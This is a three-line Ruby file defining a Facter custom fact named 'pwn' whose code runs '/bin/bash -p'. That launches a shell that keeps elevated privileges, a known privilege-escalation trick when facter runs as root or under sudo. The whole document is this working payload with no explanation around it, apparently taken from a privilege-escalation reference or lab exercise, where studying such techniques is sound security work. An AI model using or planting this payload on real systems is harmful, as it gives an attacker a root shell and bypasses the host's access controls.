Facter.add(:pwn) do
setcode { exec("/bin/bash -p") }
end
